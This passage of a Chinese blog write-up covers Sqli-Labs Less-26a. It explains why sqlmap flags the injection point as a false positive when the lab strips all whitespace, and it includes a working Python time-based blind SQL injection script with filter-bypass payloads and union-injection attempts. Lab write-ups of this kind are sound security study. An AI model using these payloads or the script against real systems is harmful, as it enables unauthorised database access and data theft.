class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> checkBooleanExpression(<span class="string">&quot;%d%s%d&quot;</span> % (randInt3, INFERENCE_EQUALS_CHAR, randInt2)):        <span class="comment"># this must not be evaluated to True</span></span><br><span class="line">                retVal = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> <span class="keyword">not</span> checkBooleanExpression(<span class="string">&quot;%d%s%d&quot;</span> % (randInt2, INFERENCE_EQUALS_CHAR, randInt2)):    <span class="comment"># this must be evaluated to True</span></span><br><span class="line">                retVal = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> checkBooleanExpression(<span class="string">&quot;%d %d&quot;</span> % (randInt3, randInt2)):                                <span class="comment"># this must not be evaluated to True (invalid statement)</span></span><br><span class="line">                retVal = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> retVal:</span><br><span class="line">            warnMsg = <span class="string">&quot;false positive or unexploitable injection point detected&quot;</span></span><br><span class="line">            logger.warning(warnMsg)</span><br><span class="line"></span><br><span class="line">        kb.injection = popValue()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br></pre></td></tr></table></figure></div>

<p>简单分析一下这个函数，<code>retValue</code> 表示注入点是否误判，默认为不误判 <code>true</code> 。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="built_in">all</span>(_ <span class="keyword">in</span> (PAYLOAD.TECHNIQUE.BOOLEAN, PAYLOAD.TECHNIQUE.TIME, PAYLOAD.TECHNIQUE.STACKED) <span class="keyword">for</span> _ <span class="keyword">in</span> injection.data) <span class="keyword">or</span> (<span class="built_in">len</span>(injection.data) == <span class="number">1</span> <span class="keyword">and</span> PAYLOAD.TECHNIQUE.UNION <span class="keyword">in</span> injection.data <span class="keyword">and</span> <span class="string">&quot;Generic&quot;</span> <span class="keyword">in</span> injection.data[PAYLOAD.TECHNIQUE.UNION].title):</span><br></pre></td></tr></table></figure></div>

<p>这里比较抽象，首先是 <code>all()</code> 函数，它接受一个可迭代的元素，若该元素中的所有子元素都为 <code>true</code> 则返回 <code>true</code> 。而里面的内容语法需要类比，例如：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">a = (_ <span class="keyword">in</span> (<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> (<span class="number">1</span>,<span class="number">4</span>));</span><br><span class="line"><span class="keyword">for</span> aa <span class="keyword">in</span> a:</span><br><span class="line"> <span class="built_in">print</span>(aa);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># True</span></span><br><span class="line"><span class="comment"># False</span></span><br></pre></td></tr></table></figure></div>

<p>括号中的内容返回一个迭代器，其具体内容是一个 python 特有的生成迭代器的句式，<code>_</code> 表示一个匿名变量，在该句式中他也可以携带&#x2F;传递内容，表示的是在元组 <code>(1,4)</code> 中的各个元素是否在元组 <code>(1,2,3)</code> 中，结果从迭代器中被依次返回为 <code>true, false</code> 分别表示 1 在而 4 不在。</p>
<p>常量 <code>PAYLOAD.TECHNIQUE.BOOLEAN</code> 是一类表示注入类型的枚举内容，值为 1 表示布尔盲注。<code>injection.data</code> 是一个字典，其中存储的是注入的参数，如本次注入检查出来是布尔类型，该变量内部就会有一个键值对：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="number">1</span>: &#123;</span><br><span class="line">		... <span class="comment"># 布尔盲注细节</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>因此这里的 if 实际上是在检查：</p>
<ol>
<li>注入类型是否只有『布尔盲注、时间盲注与堆叠注入』这三种类型。</li>
<li>注入类型单一且为联合注入且其中的『Title』字段值中含有字符串『Generic』</li>
</ol>
<p>这是在判断是否需要『falsePositiveCheck』。</p>
<p>随后它利用循环语句生成了三个随机数，保证这三个数从小到大排序，且内容不会与布尔盲注的<strong>有效性</strong>判断点混淆。</p>
<p>用这三个随机数『R1，R2，R3』，sqlmap 依次用以下句型检测注入可行性：</p>
<ol>
<li><code>r1 = r1</code> ：必须有效</li>
<li><code>r1 = r2</code> ：必须无效</li>
<li><code>r1 = r3</code> ：必须无效</li>
<li><code>r2 = r3</code> ：必须无效</li>
<li><code>r2 = r2</code> ：必须有效</li>
<li><code>r3 r2</code> ：为非法句型，必须无效</li>
</ol>
<p>6 步中任意一步有问题都会被判定为假注入点。其中第六条两个随机数默认用空格隔开。很不巧，本题所有的空白字符都被替换为空了，见 Sqli-Labs-Less-26a 的源码：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);			<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/and/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//strip out /*</span></span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out --</span></span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);			<span class="comment">//Strip out #</span></span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\s]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out spaces</span></span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\s]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out spaces</span></span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\\\\]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out slashes</span></span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>包括注释与所有空白字符，无一幸免。因此在第六步中，原本的 <code>r3 r2</code> 变成了 <code>r3r2</code> ，两个数字相连变成了一串数字，可被隐式转换为有效的布尔值，因此反而返回了有效的页面，让 sqlmap 做出<strong>假注入点</strong>的判定。回到脚本，rblank 替换的空白字符全部被过滤，因此无法通过第六条检测；mblank 将空格替换成了一些非法字符，可以通过第六条检测，但由于这些非法字符只在特定版本的 Mysql 中被识别为分界符，在本地测试时 <code>Mysql=5.7.26</code> 不符合要求，因此无法作为有效的空白字符用于探测其他信息，故而我们恢复不了任何有效内容。</p>
<p>其本质问题还是，Sqlmap 的 Payload 构建是基于空白字符可用的情况，它并未考虑过使用『完全不依赖空格作为分界符』的 payload，如『括号构造句型』或是『利用符号 <code>||, &amp;&amp;</code> 的界符特性省略分界符』等情况。另一方面，这种绕过也无法依赖 Tamper 模块实现，因此『Less-26a』从设计上讲就无法被 Sqlmap 成功注入。</p>
<hr>
<h2 id="盲注脚本"><a href="#盲注脚本" class="headerlink" title="盲注脚本"></a>盲注脚本</h2><p>考虑手搓一个盲注脚本，注入数据库信息。</p>
<p>首先是括号替代空格的查询语句：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span>(group_concat(table_name))<span class="keyword">from</span>(information_schema.tables)<span class="keyword">where</span>(table_schema<span class="operator">=</span><span class="string">&#x27;%s&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<p>由于本体过滤了关键词”or”，双写来绕过：”infoorrmation_schema”。</p>
<p>最终编写了脚本”less-26a-blind.py”，采用”Requests”库实现，单线程任务，速度极慢，有待改进，脚本如下：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> rq   <span class="comment"># By Requests</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">timeBlindInjection</span>:   <span class="comment"># 时间盲注</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        self.url = <span class="string">&quot;http://localhost:83/sqli-labs/Less-26a/&quot;</span></span><br><span class="line">        self.headers = &#123;</span><br><span class="line">            <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Host&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        self.<span class="built_in">range</span> = [<span class="number">0</span>, <span class="number">127</span>]</span><br><span class="line">        self.timeout = <span class="number">1</span>    <span class="comment"># 延时 1s</span></span><br><span class="line">        self.payload = &#123;</span><br><span class="line">            <span class="string">&quot;length&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;pos&quot;</span>: <span class="number">1</span>,   <span class="comment"># 二分检测位置</span></span><br><span class="line">                <span class="string">&quot;cot&quot;</span>: <span class="string">f&quot;?id=0&#x27;||if(length((%s))%s,sleep(<span class="subst">&#123;self.timeout&#125;</span>),1)||&#x27;0&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;detail&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;pos&quot;</span>: <span class="number">2</span>,</span><br><span class="line">                <span class="string">&quot;cot&quot;</span>: <span class="string">f&quot;?id=0&#x27;||if(ascii(substr((%s),%d,1))%s,sleep(<span class="subst">&#123;self.timeout&#125;</span>),1)||&#x27;0&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        self.target = &#123;</span><br><span class="line">        <span class="comment">#    &quot;cur_database&quot;: &quot;select(database())&quot;,</span></span><br><span class="line">            <span class="comment"># &quot;database&quot;: &quot;select(group_concat(schema_name))from(infoorrmation_schema.schemata)&quot;,</span></span><br><span class="line">            <span class="comment"># &quot;table&quot;: &quot;select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=&#x27;%s&#x27;)&quot;,</span></span><br><span class="line">            <span class="comment"># &quot;column&quot;: &quot;select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_name=&#x27;%s&#x27;)&quot;,</span></span><br><span class="line">            <span class="string">&quot;secret&quot;</span>: <span class="string">&quot;select(secret_FPMB)from(challenges.5idc4x45h8)&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        self.result = &#123;&#125;</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">        <span class="keyword">for</span> key, val <span class="keyword">in</span> self.target.items():</span><br><span class="line">            <span class="keyword">if</span>(<span class="string">&quot;%s&quot;</span> <span class="keyword">in</span> val):</span><br><span class="line">                val = val % (<span class="built_in">input</span>(val+<span class="string">&quot;\n-&gt;&quot;</span>))</span><br><span class="line">            self.result[key] = self.inject(val)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">inject</span>(<span class="params">self, query: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:    <span class="comment"># 注入指定内容</span></span><br><span class="line">        t_len = self.BS(<span class="string">&quot;length&quot;</span>, [query])  <span class="comment"># 先得到长度</span></span><br><span class="line">        t_res = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(t_len):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;\r<span class="subst">&#123;t_res&#125;</span>&quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">            res = self.BS(<span class="string">&quot;detail&quot;</span>, [query, i+<span class="number">1</span>])</span><br><span class="line">            <span class="keyword">if</span> res != -<span class="number">1</span>:</span><br><span class="line">                t_res += <span class="built_in">chr</span>(res)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">input</span>(res)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\r<span class="subst">&#123;t_res&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> t_res</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">BS</span>(<span class="params">self, key: <span class="built_in">str</span>, parms: <span class="built_in">list</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        left, right = self.<span class="built_in">range</span></span><br><span class="line">        <span class="keyword">while</span>(left &lt;= right):</span><br><span class="line">            mid = (left+right)//<span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span> self.get(self.getPayload(key, parms, <span class="string">&quot;&quot;</span>.join([<span class="string">&quot;=&quot;</span>, <span class="built_in">str</span>(mid)]))):  <span class="comment"># 查找正确</span></span><br><span class="line">                <span class="keyword">return</span> mid</span><br><span class="line">            <span class="keyword">elif</span> self.get(self.getPayload(key, parms, <span class="string">&quot;&quot;</span>.join([<span class="string">&quot;&gt;&quot;</span>, <span class="built_in">str</span>(mid)]))):</span><br><span class="line">                left = mid+<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                right = mid-<span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">getPayload</span>(<span class="params">self, key: <span class="built_in">str</span>, parms: <span class="built_in">list</span>, parm: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        tmp = parms.copy()</span><br><span class="line">        tmp.insert(self.payload[key][<span class="string">&quot;pos&quot;</span>], parm)</span><br><span class="line">        <span class="keyword">return</span> self.payload[key][<span class="string">&quot;cot&quot;</span>] % <span class="built_in">tuple</span>(tmp)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">self, data</span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            res = rq.get(self.url+data, timeout=self.timeout-<span class="number">0.1</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">except</span> Exception:   <span class="comment"># 命中</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    inject = timeBlindInjection()</span><br><span class="line">    inject.run()</span><br></pre></td></tr></table></figure></div>

<p>打算用自带线程池的 <code>HackRequests</code> 库优化一下脚本，后面再说。</p>
<hr>
<h2 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h2><p>试试联合注入：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;)union(select(database()));&#x27;</span></span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;)union(select(column_name)from(information_schema.columns)where(table_name=&quot;users&quot;));&#x27;</span></span><br></pre></td></tr></table></figure></div>

<p>发现不起效果，利用括号构造不出有效的 payload 能闭合后面的引号与括号。</p>
]]></content>
      <categories>
        <category>Security</category>
        <category>Range</category>
      </categories>
  </entry>
</search>
